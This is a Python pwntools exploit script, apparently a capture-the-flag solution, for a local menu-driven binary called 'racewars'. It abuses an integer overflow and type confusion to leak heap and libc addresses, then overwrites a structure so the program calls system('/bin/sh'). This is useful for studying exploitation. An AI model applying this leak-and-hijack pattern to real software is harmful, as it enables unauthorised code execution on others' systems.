from pwn import *

b = ELF("./racewars")
l = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def leak(idx, length):
	leaked = ""
	for i in range(length):
		now_idx = idx + i
		p.sendlineafter("CHOICE: ", "4")
		p.sendlineafter("which gear to modify? ", str(now_idx))
		p.recvuntil(" is ")
		leaked += chr(int(p.recvuntil(",")[:-1]))
		# log.info("[%d] leaked : 0x%x" % (i, ord(leaked[i])))
		p.sendlineafter("modify to what?: ", "0")
		p.sendlineafter("(1 = yes, 0 = no)", "0")
	return leaked

def write(idx, data):
	leaked = ""
        for i in range(len(data)):
                now_idx = idx + i
                p.sendlineafter("CHOICE: ", "4")
                p.sendlineafter("which gear to modify? ", str(now_idx))
                p.recvuntil(" is ")
		leaked += chr(int(p.recvuntil(",")[:-1]))
                #log.info("[%d] leaked : 0x%x" % (i, ord(leaked[i])))
                p.sendlineafter("modify to what?: ", str(ord(data[i])))
                p.sendlineafter("(1 = yes, 0 = no)", "1")

p = process("./racewars")

p.sendlineafter("CHOICE: ", "2")
p.sendlineafter(" mitsubishi eclipse", "1")
p.sendlineafter("CHOICE: ", "3")

# tire can be overlapped with other structures by type confusion + integer overflow
# possible to modify pointer of tire => possible to control other structure data
size = 0x8000000
p.sendlineafter("CHOICE: ", "1")
p.sendlineafter("how many pairs of tires do you need?", str(size))

# overlap gear with tire
p.sendlineafter("CHOICE: ", "4")
p.sendlineafter("transmission? ", "1")

# size : 0xffffffffffffffff
p.sendlineafter("CHOICE: ", "1")
p.sendlineafter("CHOICE: ", "1")
p.sendlineafter("new width: ", "65535")
p.sendlineafter("CHOICE: ", "1")
p.sendlineafter("CHOICE: ", "2")
p.sendlineafter("new aspect_ratio: ", "65535")
p.sendlineafter("CHOICE: ", "1")
p.sendlineafter("CHOICE: ", "3")
p.sendlineafter("new construction (R for radial): ", "65535")
p.sendlineafter("CHOICE: ", "1")
p.sendlineafter("CHOICE: ", "4")
p.sendlineafter("new diameter: ", "65535")

# heap leak
leaked = u64(leak(-184, 8))
heap = leaked - 0x2010
gear = heap + 0xd0
log.info("leaked = 0x%x", leaked)
log.info("heap   = 0x%x", heap)
log.info("gear   = 0x%x", gear)

# libc leak
offset_printf = b.got['printf'] - gear
printf = u64(leak(offset_printf, 8))
log.info("printf = 0x%x", printf)

# for using libcdb
offset_puts = b.got['puts'] - gear
puts = u64(leak(offset_puts, 8))
log.info("puts   = 0x%x", puts)

system = puts - (l.symbols['puts'] - l.symbols['system'])
payload = p64(system) + p64(heap + 0xf0)
payload += "/bin/sh"
offset_fengshui = heap + 0xe0 - gear
write(offset_fengshui, payload)

offset_vuln = heap + 0x50 - gear
write(offset_vuln, p64(heap + 0xe0))

p.sendlineafter("CHOICE: ", "6")

p.interactive()

